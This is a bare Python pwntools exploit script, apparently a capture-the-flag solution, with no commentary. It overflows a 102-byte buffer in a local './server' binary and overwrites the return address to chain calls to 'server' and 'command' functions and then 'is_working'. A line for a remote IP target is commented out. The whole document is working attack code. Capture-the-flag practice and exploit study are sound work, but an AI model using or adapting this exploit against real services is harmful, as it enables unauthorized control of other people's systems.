from pwn import *
def main():
    r = process('./server')
    #r = remote('104.250.105.158',6006)
    offset = 102
    server_1 = 0x08049535
    server_2 = 0x0804954b
    server_3 = 0x08049561
    server_4 = 0x08049577
    server_5 = 0x0804958d
    server_6 = 0x080495a3
    server_7 = 0x080495b9
    server_8 = 0x080495cf
    is_working = 0x080495e5
    command = 0x080492ac

    p = "a" * offset
    p += p32(server_1)
    p += p32(command)
    r.sendline(p)

    p = "a" * offset
    p += p32(server_2)
    p += p32(command)
    r.sendline(p)

    p = "a" * offset
    p += p32(server_3)
    p += p32(command)
    r.sendline(p)

    p = "a" * offset
    p += p32(server_4)
    p += p32(command)
    r.sendline(p)

    p = "a" * offset
    p += p32(server_5)
    p += p32(command)
    r.sendline(p)

    p = "a" * offset
    p += p32(server_6)
    p += p32(command)
    r.sendline(p)

    p = "a" * offset
    p += p32(server_7)
    p += p32(command)
    r.sendline(p)

    p = "a" * offset
    p += p32(server_8)
    p += p32(command)
    r.sendline(p)

    p = "a" * offset
    p += p32(is_working)
    r.sendline(p)

    r.interactive()

if __name__ == '__main__':
    main()
